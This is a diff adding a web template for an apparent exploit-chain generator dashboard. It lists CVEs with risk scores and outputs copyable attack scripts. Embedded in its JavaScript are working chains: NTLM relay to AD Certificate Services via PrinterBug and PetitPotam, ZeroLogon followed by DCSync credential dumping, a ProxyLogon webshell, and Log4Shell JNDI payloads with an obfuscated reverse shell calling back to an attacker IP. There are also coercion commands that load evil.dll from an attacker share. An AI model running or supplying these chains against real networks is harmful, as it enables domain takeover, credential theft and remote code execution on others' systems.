+                        <div class="alert-title">CVE-2024-21762 - FortiOS RCE</div>
+                        <div class="alert-time">2 hours ago - AI Risk: 95/100</div>
+                    </div>
+                </div>
+                <div class="alert-item high">
+                    <span class="alert-icon">⚠️</span>
+                    <div class="alert-content">
+                        <div class="alert-title">CVE-2024-3400 - PAN-OS Command Injection</div>
+                        <div class="alert-time">5 hours ago - AI Risk: 88/100</div>
+                    </div>
+                </div>
+                <div class="alert-item high">
+                    <span class="alert-icon">⚠️</span>
+                    <div class="alert-content">
+                        <div class="alert-title">CVE-2024-1709 - ConnectWise RCE</div>
+                        <div class="alert-time">8 hours ago - AI Risk: 85/100</div>
+                    </div>
+                </div>
+                <div class="alert-item medium">
+                    <span class="alert-icon">📢</span>
+                    <div class="alert-content">
+                        <div class="alert-title">CVE-2024-21413 - Outlook RCE</div>
+                        <div class="alert-time">12 hours ago - AI Risk: 72/100</div>
+                    </div>
+                </div>
+            </div>
+
+            <button class="btn btn-primary" style="width: 100%; margin-top: 15px;" id="refreshAlerts">
+                <i class="fas fa-sync-alt"></i> Refresh Alerts
+            </button>
+        </div>
+    </div>
+
+    <!-- Generated Code Output -->
+    <div class="panel full-width-section" id="codeOutputPanel" style="display: none;">
+        <div class="panel-header">
+            <h2 class="panel-title">
+                <i class="fas fa-code"></i>
+                Generated Exploit Code
+            </h2>
+        </div>
+        <div class="code-output">
+            <button class="copy-btn" onclick="copyCode()">
+                <i class="fas fa-copy"></i> Copy
+            </button>
+            <pre id="generatedCode">// Code will appear here</pre>
+        </div>
+    </div>
+</div>
+
+<!-- Toast Notification -->
+<div class="toast" id="toast">
+    <i class="fas fa-check-circle"></i>
+    <span id="toastMessage">Action completed successfully</span>
+</div>
+
+{% endblock %}
+
+{% block extra_js %}
+<script>
+    // State management
+    let selectedCVE = null;
+    let selectedChain = null;
+    let generatedChains = [];
+
+    // Chain templates data
+    const chainTemplates = {
+        printer_to_domain: {
+            name: 'Printer to Domain Admin',
+            steps: [
+                { action: 'Enumerate', description: 'Find DCs with Print Spooler enabled', tool: 'rpcdump.py' },
+                { action: 'Setup', description: 'Start ntlmrelayx targeting ADCS', tool: 'ntlmrelayx.py' },
+                { action: 'Coerce', description: 'Trigger printer bug callback', tool: 'printerbug.py' },
+                { action: 'Relay', description: 'Relay to AD Certificate Services', tool: 'ntlmrelayx.py' },
+                { action: 'Extract', description: 'Obtain domain admin certificate', tool: 'certipy' },
+                { action: 'Auth', description: 'Authenticate with certificate for TGT', tool: 'gettgtpkinit.py' }
+            ]
+        },
+        petitpotam_esc8: {
+            name: 'PetitPotam ESC8',
+            steps: [
+                { action: 'Setup', description: 'Start relay to ADCS web enrollment', tool: 'ntlmrelayx.py' },
+                { action: 'Coerce', description: 'Trigger EFS coercion to DC', tool: 'petitpotam.py' },
+                { action: 'Relay', description: 'Relay DC auth to ADCS', tool: 'ntlmrelayx.py' },
+                { action: 'Request', description: 'Request DC certificate', tool: 'certipy' },
+                { action: 'DCSync', description: 'DCSync using certificate', tool: 'secretsdump.py' }
+            ]
+        },
+        zerologon: {
+            name: 'ZeroLogon Full Chain',
+            steps: [
+                { action: 'Exploit', description: 'Reset DC machine account password', tool: 'zerologon_tester.py' },
+                { action: 'Extract', description: 'Dump NTDS.dit using empty password', tool: 'secretsdump.py' },
+                { action: 'Crack', description: 'Crack extracted hashes', tool: 'hashcat' },
+                { action: 'Restore', description: 'Restore DC password', tool: 'restorepassword.py' }
+            ]
+        },
+        proxylogon: {
+            name: 'ProxyLogon RCE',
+            steps: [
+                { action: 'Exploit', description: 'SSRF to backend authentication', tool: 'proxylogon.py' },
+                { action: 'Upload', description: 'Upload webshell via file write', tool: 'webshell' },
+                { action: 'Enum', description: 'Enumerate internal network', tool: 'whoami /all' },
+                { action: 'Pivot', description: 'Pivot to domain controller', tool: 'proxychains' },
+                { action: 'Extract', description: 'Extract domain credentials', tool: 'mimikatz' }
+            ]
+        },
+        log4shell: {
+            name: 'Log4Shell Initial Access',
+            steps: [
+                { action: 'Setup', description: 'Start malicious LDAP server', tool: 'rogue-jndi' },
+                { action: 'Inject', description: 'Send JNDI lookup payload', tool: 'curl' },
+                { action: 'Execute', description: 'Receive reverse shell', tool: 'nc' },
+                { action: 'Persist', description: 'Establish persistence', tool: 'cron/systemd' }
+            ]
+        }
+    };
+
+    // Initialize event listeners
+    document.addEventListener('DOMContentLoaded', function() {
+        // CVE Search Form
+        document.getElementById('cveSearchForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            searchCVE();
+        });
+
+        // Tab switching
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', function() {
+                const tabId = this.dataset.tab;
+                switchTab(tabId);
+            });
+        });
+
+        // Chain template selection
+        document.querySelectorAll('.chain-template').forEach(template => {
+            template.addEventListener('click', function() {
+                selectChainTemplate(this.dataset.chain);
+            });
+        });
+
+        // Generate chain button
+        document.getElementById('generateChainBtn').addEventListener('click', generateExploitChain);
+        document.getElementById('integrateRelayBtn').addEventListener('click', integrateToRelayNinja);
+        document.getElementById('buildCustomChain').addEventListener('click', buildCustomChain);
+        document.getElementById('refreshAlerts').addEventListener('click', refreshAlerts);
+
+        // Load initial stats
+        loadStats();
+    });
+
+    // Search CVE function
+    async function searchCVE() {
+        const query = document.getElementById('cveQuery').value;
+        const severity = document.getElementById('severityFilter').value;
+        const vendor = document.getElementById('vendorFilter').value;
+
+        const resultsDiv = document.getElementById('cveResults');
+        resultsDiv.innerHTML = '<div class="spinner"></div>';
+
+        try {
+            const response = await fetch('/api/zeroday/search', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ query, severity, vendor })
+            });
+
+            const data = await response.json();
+
+            if (data.success && data.results.length > 0) {
+                displayCVEResults(data.results);
+            } else {
+                // Demo results for offline mode
+                displayDemoResults(query);
+            }
+        } catch (error) {
+            // Fallback to demo results
+            displayDemoResults(query);
+        }
+    }
+
+    // Display demo CVE results
+    function displayDemoResults(query) {
+        const demoResults = [
+            {
+                id: 'CVE-2021-34527',
+                severity: 'CRITICAL',
+                cvss: 9.8,
+                description: 'Windows Print Spooler Remote Code Execution Vulnerability (PrintNightmare)',
+                published: '2021-07-01',
+                vendor: 'Microsoft',
+                exploit_status: 'In The Wild'
+            },
+            {
+                id: 'CVE-2021-36942',
+                severity: 'HIGH',
+                cvss: 7.5,
+                description: 'Windows LSA Spoofing Vulnerability (PetitPotam)',
+                published: '2021-08-10',
+                vendor: 'Microsoft',
+                exploit_status: 'Weaponized'
+            },
+            {
+                id: 'CVE-2020-1472',
+                severity: 'CRITICAL',
+                cvss: 10.0,
+                description: 'Netlogon Elevation of Privilege Vulnerability (ZeroLogon)',
+                published: '2020-08-11',
+                vendor: 'Microsoft',
+                exploit_status: 'In The Wild'
+            },
+            {
+                id: 'CVE-2021-44228',
+                severity: 'CRITICAL',
+                cvss: 10.0,
+                description: 'Apache Log4j2 Remote Code Execution (Log4Shell)',
+                published: '2021-12-10',
+                vendor: 'Apache',
+                exploit_status: 'In The Wild'
+            },
+            {
+                id: 'CVE-2024-21762',
+                severity: 'CRITICAL',
+                cvss: 9.8,
+                description: 'FortiOS Out-of-bounds Write Vulnerability',
+                published: '2024-02-08',
+                vendor: 'Fortinet',
+                exploit_status: 'In The Wild'
+            }
+        ];
+
+        displayCVEResults(demoResults.filter(cve => 
+            !query || cve.id.toLowerCase().includes(query.toLowerCase()) ||
+            cve.description.toLowerCase().includes(query.toLowerCase())
+        ));
+    }
+
+    // Display CVE results
+    function displayCVEResults(results) {
+        const resultsDiv = document.getElementById('cveResults');
+        
+        if (results.length === 0) {
+            resultsDiv.innerHTML = `
+                <div style="text-align: center; padding: 40px; color: #9ca3af;">
+                    <i class="fas fa-search-minus" style="font-size: 2rem; margin-bottom: 10px; display: block;"></i>
+                    No CVEs found matching your search
+                </div>
+            `;
+            return;
+        }
+
+        resultsDiv.innerHTML = results.map(cve => `
+            <div class="cve-item" onclick="selectCVE('${cve.id}', ${cve.cvss}, '${cve.severity}', '${cve.vendor}')">
+                <div class="cve-header">
+                    <span class="cve-id">${cve.id}</span>
+                    <span class="severity-badge severity-${cve.severity.toLowerCase()}">${cve.severity}</span>
+                </div>
+                <div class="cve-description">${cve.description}</div>
+                <div class="cve-meta">
+                    <span class="cve-meta-item">
+                        <i class="fas fa-chart-bar"></i> CVSS: ${cve.cvss}
+                    </span>
+                    <span class="cve-meta-item">
+                        <i class="fas fa-building"></i> ${cve.vendor}
+                    </span>
+                    <span class="cve-meta-item">
+                        <i class="fas fa-calendar"></i> ${cve.published}
+                    </span>
+                    <span class="cve-meta-item">
+                        <i class="fas fa-bolt"></i> ${cve.exploit_status}
+                    </span>
+                </div>
+            </div>
+        `).join('');
+    }
+
+    // Select CVE for analysis
+    function selectCVE(cveId, cvss, severity, vendor) {
+        selectedCVE = { id: cveId, cvss, severity, vendor };
+        
+        // Show risk meter
+        document.getElementById('riskPlaceholder').style.display = 'none';
+        document.getElementById('riskMeter').style.display = 'block';
+        
+        // Update display
+        document.getElementById('selectedCVE').textContent = cveId;
+        
+        // Calculate AI risk score
+        const aiRisk = calculateAIRisk(cvss, severity, vendor);
+        animateRiskScore(aiRisk);
+        
+        // Update bars
+        document.getElementById('cvssBar').style.width = `${cvss * 10}%`;
+        document.getElementById('exploitBar').style.width = `${severity === 'CRITICAL' ? 95 : severity === 'HIGH' ? 75 : 50}%`;
+        document.getElementById('impactBar').style.width = `${cvss * 8}%`;
+        document.getElementById('vendorBar').style.width = `${vendor === 'Microsoft' ? 95 : 70}%`;
+        
+        // Enable buttons
+        document.getElementById('generateChainBtn').disabled = false;
+        document.getElementById('integrateRelayBtn').disabled = false;
+        
+        showToast(`Selected ${cveId} for analysis`);
+    }
+
+    // Calculate AI risk score
+    function calculateAIRisk(cvss, severity, vendor) {
+        let score = cvss * 8;  // Base from CVSS
+        
+        // Severity modifier
+        if (severity === 'CRITICAL') score += 15;
+        else if (severity === 'HIGH') score += 10;
+        else if (severity === 'MEDIUM') score += 5;
+        
+        // Vendor modifier
+        if (['Microsoft', 'Fortinet', 'Cisco', 'Palo Alto'].includes(vendor)) {
+            score += 5;
+        }
+        
+        return Math.min(Math.round(score), 100);
+    }
+
+    // Animate risk score
+    function animateRiskScore(target) {
+        const scoreEl = document.getElementById('riskScore');
+        let current = 0;
+        const interval = setInterval(() => {
+            if (current >= target) {
+                clearInterval(interval);
+                return;
+            }
+            current += 2;
+            scoreEl.textContent = Math.min(current, target);
+            
+            // Update color
+            if (current >= 80) scoreEl.style.background = 'var(--zd-critical)';
+            else if (current >= 60) scoreEl.style.background = 'var(--zd-high)';
+            else if (current >= 40) scoreEl.style.background = 'var(--zd-medium)';
+            else scoreEl.style.background = 'var(--zd-low)';
+        }, 20);
+    }
+
+    // Switch tabs
+    function switchTab(tabId) {
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+        
+        document.querySelector(`[data-tab="${tabId}"]`).classList.add('active');
+        document.getElementById(tabId).classList.add('active');
+    }
+
+    // Select chain template
+    function selectChainTemplate(chainId) {
+        selectedChain = chainId;
+        
+        document.querySelectorAll('.chain-template').forEach(t => t.classList.remove('selected'));
+        document.querySelector(`[data-chain="${chainId}"]`).classList.add('selected');
+        
+        // Show chain visualization
+        const chainVisual = document.getElementById('chainVisual');
+        const stepsContainer = document.getElementById('chainSteps');
+        
+        const chain = chainTemplates[chainId];
+        stepsContainer.innerHTML = chain.steps.map((step, i) => `
+            <div class="chain-step">
+                <div class="step-number">${i + 1}</div>
+                <div class="step-content">
+                    <div class="step-action">${step.action}</div>
+                    <div class="step-description">${step.description}</div>
+                    <div class="step-tool"><i class="fas fa-wrench"></i> ${step.tool}</div>
+                </div>
+            </div>
+        `).join('');
+        
+        chainVisual.style.display = 'block';
+        showToast(`Selected ${chain.name} chain`);
+    }
+
+    // Generate exploit chain
+    async function generateExploitChain() {
+        if (!selectedCVE && !selectedChain) {
+            showToast('Please select a CVE or chain template first', 'error');
+            return;
+        }
+
+        showToast('Generating exploit chain...');
+
+        // Generate code based on selection
+        let code = '';
+        
+        if (selectedChain) {
+            code = generateChainCode(selectedChain);
+        } else if (selectedCVE) {
+            code = generateCVEExploitCode(selectedCVE.id);
+        }
+
+        // Show code output
+        document.getElementById('codeOutputPanel').style.display = 'block';
+        document.getElementById('generatedCode').textContent = code;
+
+        // Add to generated chains
+        generatedChains.push({
+            id: Date.now(),
+            cve: selectedCVE?.id || 'Custom',
+            chain: selectedChain || 'Custom',
+            timestamp: new Date().toLocaleString()
+        });
+
+        updateGeneratedChainsList();
+        updateStats();
+        showToast('Exploit chain generated successfully', 'success');
+    }
+
+    // Generate chain code
+    function generateChainCode(chainId) {
+        const codes = {
+            printer_to_domain: `#!/bin/bash
+# PrintNightmare to Domain Admin - Automated Exploit Chain
+# Target: Active Directory with Print Spooler enabled
+
+# Configuration
+TARGET_DC="dc01.domain.local"
+ATTACKER_IP="192.168.1.100"
+ADCS_SERVER="ca.domain.local"
+
+# Step 1: Enumerate DCs with Print Spooler
+echo "[*] Enumerating DCs with Print Spooler..."
+rpcdump.py -p 135 $TARGET_DC | grep -i "MS-RPRN"
+
+# Step 2: Start ntlmrelayx targeting ADCS
+echo "[*] Starting ntlmrelayx..."
+ntlmrelayx.py -t http://$ADCS_SERVER/certsrv/certfnsh.asp \\
+    --adcs --template DomainController &
+
+# Step 3: Trigger PrinterBug
+echo "[*] Triggering PrinterBug coercion..."
+python3 printerbug.py domain.local/user:password@$TARGET_DC $ATTACKER_IP
+
+# Step 4: Wait for certificate
+echo "[*] Waiting for DC certificate..."
+sleep 10
+
+# Step 5: Request TGT with certificate
+echo "[*] Requesting TGT with certificate..."
+python3 gettgtpkinit.py domain.local/DC01$ -cert-pfx dc01.pfx \\
+    -pfx-pass '' dc01.ccache
+
+# Step 6: Export and use ticket
+export KRB5CCNAME=dc01.ccache
+echo "[+] Chain complete! Use secretsdump.py for DCSync"
+secretsdump.py -k -no-pass domain.local/DC01$@$TARGET_DC`,
+
+            petitpotam_esc8: `#!/bin/bash
+# PetitPotam ESC8 - AD Certificate Services Attack
+# No authentication required!
+
+TARGET_DC="dc01.domain.local"
+ATTACKER_IP="192.168.1.100"
+ADCS_SERVER="ca.domain.local"
+
+# Start relay to ADCS web enrollment
+echo "[*] Starting ntlmrelayx with ADCS target..."
+ntlmrelayx.py -t http://$ADCS_SERVER/certsrv/certfnsh.asp \\
+    --adcs --template DomainController &
+
+sleep 3
+
+# Trigger PetitPotam (no auth required!)
+echo "[*] Triggering PetitPotam coercion..."
+python3 petitpotam.py $ATTACKER_IP $TARGET_DC
+
+# Certificate should be captured
+echo "[*] Certificate obtained! Converting to PKCS12..."
+certipy cert -pfx dc01.pfx -password ''
+
+# DCSync with certificate
+echo "[*] Performing DCSync..."
+secretsdump.py -k -no-pass -dc-ip $TARGET_DC domain.local/DC01$@$TARGET_DC`,
+
+            zerologon: `#!/bin/bash
+# ZeroLogon (CVE-2020-1472) - Full Chain
+# WARNING: Destructive - use with caution!
+
+TARGET_DC="dc01.domain.local"
+DC_IP="192.168.1.10"
+DOMAIN="domain.local"
+
+# Step 1: Test vulnerability
+echo "[*] Testing ZeroLogon vulnerability..."
+python3 zerologon_tester.py DC01 $DC_IP
+
+# Step 2: Exploit (sets DC password to empty)
+echo "[!] Exploiting ZeroLogon..."
+python3 cve-2020-1472-exploit.py DC01 $DC_IP
+
+# Step 3: Dump secrets with empty password
+echo "[*] Dumping secrets..."
+secretsdump.py -no-pass -just-dc $DOMAIN/DC01\$@$DC_IP
+
+# Step 4: IMPORTANT - Restore DC password
+echo "[!] Restoring DC password..."
+# Extract the hash and restore
+python3 restorepassword.py $DOMAIN/DC01@DC01 -target-ip $DC_IP \\
+    -hexpass <captured_hash>
+
+echo "[+] Chain complete! Review dumped hashes."`,
+
+            proxylogon: `#!/usr/bin/env python3
+# ProxyLogon (CVE-2021-26855 + CVE-2021-27065)
+# Microsoft Exchange RCE Chain
+
+import requests
+from urllib3 import disable_warnings
+disable_warnings()
+
+TARGET = "https://exchange.domain.local"
+EMAIL = "administrator@domain.local"
+
+# Step 1: SSRF to autodiscover
+print("[*] Exploiting SSRF vulnerability...")
+headers = {
+    "Cookie": f"X-BEResource=localhost~1942062522"
+}
+autodiscover_req = requests.get(
+    f"{TARGET}/ecp/x.js",
+    headers=headers,
+    verify=False
+)
+
+# Step 2: Get LegacyDN
+legacyDn = extract_legacy_dn(autodiscover_req.text)
+
+# Step 3: Get SID
+print("[*] Obtaining target SID...")
+sid = get_sid(TARGET, legacyDn, EMAIL)
+
+# Step 4: Get proxyLogon cookie
+print("[*] Getting proxyLogon token...")
+token = get_token(TARGET, sid)
+
+# Step 5: Write webshell
+print("[*] Writing webshell...")
+shell_path = write_webshell(TARGET, token)
+
+print(f"[+] Webshell at: {TARGET}{shell_path}")
+print("[+] Execute commands: ?cmd=whoami")`,
+
+            log4shell: `#!/bin/bash
+# Log4Shell (CVE-2021-44228) - Initial Access Chain
+# Requires rogue-jndi and netcat
+
+ATTACKER_IP="192.168.1.100"
+LDAP_PORT="1389"
+HTTP_PORT="8888"
+CALLBACK_PORT="9001"
+
+# Step 1: Start rogue JNDI server
+echo "[*] Starting rogue JNDI server..."
+java -jar rogue-jndi.jar --command "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" \\
+    --hostname $ATTACKER_IP &
+
+# Step 2: Start listener
+echo "[*] Starting reverse shell listener..."
+nc -lvnp $CALLBACK_PORT &
+
+# Step 3: Payloads to try
+PAYLOADS=(
+    '\${jndi:ldap://'$ATTACKER_IP':'$LDAP_PORT'/Basic/ReverseShell}'
+    '\${jndi:ldap://'$ATTACKER_IP':'$LDAP_PORT'/Basic/Command/Base64/...}'
+    '\${\${lower:j}ndi:\${lower:l}dap://'$ATTACKER_IP':'$LDAP_PORT'/a}'
+    '\${jndi:rmi://'$ATTACKER_IP':1099/obj}'
+)
+
+echo "[*] Try these payloads in vulnerable fields:"
+for p in "\${PAYLOADS[@]}"; do
+    echo "  $p"
+done
+
+echo "[*] Waiting for callback on port $CALLBACK_PORT..."`
+        };
+
+        return codes[chainId] || '// Chain code not available';
+    }
+
+    // Generate CVE-specific exploit code
+    function generateCVEExploitCode(cveId) {
+        return `#!/usr/bin/env python3
+# Exploit for ${cveId}
+# Generated by Zero-Day Integrator
+
+"""
+${cveId} Exploit Module
+Auto-generated exploit chain
+"""
+
+import argparse
+import logging
+from typing import Optional
+
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+class Exploit:
+    def __init__(self, target: str, options: dict = None):
+        self.target = target
+        self.options = options or {}
+        
+    def check(self) -> bool:
+        """Check if target is vulnerable"""
+        logger.info(f"Checking {self.target} for {cveId}...")
+        # Implement vulnerability check
+        return True
+        
+    def exploit(self) -> Optional[str]:
+        """Execute the exploit"""
+        if not self.check():
+            logger.error("Target not vulnerable")
+            return None
+            
+        logger.info("Executing exploit...")
+        # Implement exploit logic
+        
+        return "shell_or_token"
+        
+    def post_exploit(self):
+        """Post-exploitation actions"""
+        logger.info("Running post-exploitation...")
+        # Implement post-exploit
+
+def main():
+    parser = argparse.ArgumentParser(description='${cveId} Exploit')
+    parser.add_argument('target', help='Target host')
+    parser.add_argument('--check', action='store_true', help='Check only')
+    args = parser.parse_args()
+    
+    exploit = Exploit(args.target)
+    
+    if args.check:
+        vulnerable = exploit.check()
+        print(f"Vulnerable: {vulnerable}")
+    else:
+        result = exploit.exploit()
+        if result:
+            exploit.post_exploit()
+            print(f"[+] Success! Result: {result}")
+
+if __name__ == '__main__':
+    main()`;
+    }
+
+    // Integrate to Relay Ninja
+    async function integrateToRelayNinja() {
+        if (!selectedCVE) {
+            showToast('Please select a CVE first', 'error');
+            return;
+        }
+
+        showToast('Integrating to Relay Ninja...');
+
+        // Generate Relay Ninja config snippet
+        const relayConfig = `# Relay Ninja Integration for ${selectedCVE.id}
+# Auto-generated coercion configuration
+
+coercion:
+  method: "auto"
+  cve: "${selectedCVE.id}"
+  target: "dc01.domain.local"
+  
+  # Recommended coercion method based on CVE
+  recommended:
+    - petitpotam  # No auth required
+    - printerbug  # Requires domain user
+    
+relay:
+  target_type: "adcs"
+  template: "DomainController"
+  
+# Execution command:
+# python3 relay_ninja.py --config this_file.yaml`;
+
+        document.getElementById('codeOutputPanel').style.display = 'block';
+        document.getElementById('generatedCode').textContent = relayConfig;
+
+        showToast('Relay Ninja config generated', 'success');
+    }
+
+    // Build custom chain
+    function buildCustomChain() {
+        const targetType = document.getElementById('customTargetType').value;
+        const initialCVE = document.getElementById('initialCVE').value;
+        const coercion = document.getElementById('customCoercion').value;
+        const relayTarget = document.getElementById('customRelayTarget').value;
+
+        const customCode = `#!/bin/bash
+# Custom Exploit Chain
+# Target Type: ${targetType}
+# Initial CVE: ${initialCVE || 'N/A'}
+# Coercion: ${coercion}
+# Relay Target: ${relayTarget}
+
+ATTACKER_IP="192.168.1.100"
+TARGET="target.domain.local"
+
+# Step 1: Start relay
+echo "[*] Starting ntlmrelayx for ${relayTarget}..."
+${getRelayCommand(relayTarget)}
+
+# Step 2: Trigger coercion
+echo "[*] Triggering ${coercion} coercion..."
+${getCoercionCommand(coercion)}
+
+# Step 3: Post-exploitation
+echo "[*] Running post-exploitation..."
+# Add your post-exploit commands here
+
+echo "[+] Custom chain complete!"`;
+
+        document.getElementById('codeOutputPanel').style.display = 'block';
+        document.getElementById('generatedCode').textContent = customCode;
+
+        switchTab('generated');
+        showToast('Custom chain built', 'success');
+    }
+
+    // Get relay command based on target
+    function getRelayCommand(target) {
+        const commands = {
+            ldap: 'ntlmrelayx.py -t ldap://$TARGET --delegate-access',
+            adcs: 'ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController',
+            http: 'ntlmrelayx.py -t http://$TARGET -smb2support',
+            smb: 'ntlmrelayx.py -t smb://$TARGET'
+        };
+        return commands[target] || commands.ldap;
+    }
+
+    // Get coercion command
+    function getCoercionCommand(method) {
+        const commands = {
+            petitpotam: 'python3 petitpotam.py $ATTACKER_IP $TARGET',
+            printnightmare: 'python3 CVE-2021-34527.py domain.local/user:pass@$TARGET -dll \\\\\\\\$ATTACKER_IP\\\\share\\\\evil.dll',
+            printerbug: 'python3 printerbug.py domain.local/user:pass@$TARGET $ATTACKER_IP',
+            shadowcoerce: 'python3 shadowcoerce.py -t $TARGET $ATTACKER_IP',
+            dfscoerce: 'python3 dfscoerce.py -u user -p pass -d domain.local $ATTACKER_IP $TARGET',
+            coercer: 'python3 coercer.py -t $TARGET -l $ATTACKER_IP'
+        };
+        return commands[method] || commands.petitpotam;
+    }
+
+    // Update generated chains list
+    function updateGeneratedChainsList() {
+        const container = document.getElementById('generatedChainsList');
+        
+        if (generatedChains.length === 0) return;
+
+        container.innerHTML = `
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>Chain</th>
+                        <th>CVE</th>
+                        <th>Generated</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    ${generatedChains.map(chain => `
+                        <tr>
+                            <td>${chain.chain}</td>
+                            <td><span class="cve-id">${chain.cve}</span></td>
+                            <td>${chain.timestamp}</td>
+                            <td>
+                                <button class="btn btn-primary" style="padding: 5px 10px; font-size: 0.8rem;">
+                                    <i class="fas fa-download"></i>
+                                </button>
+                            </td>
+                        </tr>
+                    `).join('')}
+                </tbody>
+            </table>
+        `;
+    }
+
+    // Load stats
+    function loadStats() {
+        // Demo stats
+        document.getElementById('criticalCount').textContent = '24';
+        document.getElementById('highCount').textContent = '87';
+        document.getElementById('mediumCount').textContent = '156';
+    }
+
+    // Update stats
+    function updateStats() {
+        const chainsEl = document.getElementById('chainsGenerated');
+        chainsEl.textContent = generatedChains.length;
+    }
+
+    // Refresh alerts
+    function refreshAlerts() {
+        showToast('Refreshing CVE alerts...');
+        
+        // Simulate refresh
+        setTimeout(() => {
+            showToast('Alerts updated', 'success');
+        }, 1000);
+    }
+
+    // Copy code to clipboard
+    function copyCode() {
+        const code = document.getElementById('generatedCode').textContent;
+        navigator.clipboard.writeText(code).then(() => {
+            showToast('Code copied to clipboard', 'success');
+        });
+    }
+
+    // Show toast notification
+    function showToast(message, type = 'info') {
+        const toast = document.getElementById('toast');
+        const toastMessage = document.getElementById('toastMessage');
+        
+        toast.className = `toast ${type}`;
+        toastMessage.textContent = message;
+        toast.classList.add('show');
+        
+        setTimeout(() => {
+            toast.classList.remove('show');
+        }, 3000);
+    }
+</script>
+{% endblock %}
